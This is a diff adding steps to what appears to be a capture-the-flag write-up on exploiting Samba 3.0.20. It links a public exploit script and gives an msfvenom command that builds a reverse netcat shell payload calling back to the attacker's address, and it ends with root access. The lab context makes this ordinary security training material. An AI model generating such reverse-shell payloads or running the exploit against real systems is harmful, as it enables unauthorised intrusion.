@@ -123,4 +123,17 @@ the next thing that drives my attention is port 445 is running a **Samba 3.0.20*
 ![](/assets/images/Beginner-Track/pic3.png)
 
 
-We can see that there are some possible exploits for *samba 3.0.20* but none of the search work for us because we are not going to use metasploit on this machine.
+We can see that there are some possible exploits for *samba 3.0.20* but none of the search work for us because we are not going to use metasploit on this machine. We do the same search on google and we find a exploit that works on :
+
+  * https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py
+
+The only thing that we need to change in this exploit is the payload with the command that is showing on the exploit. On my case the command was :
+
+  *  msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.4 LPORT=443 -f python
+
+![](/assets/images/Beginner-Track/pic4.png)  
+
+
+Run the exploit and we are in as **root**
+
+![](/assets/images/Beginner-Track/pic5.png)
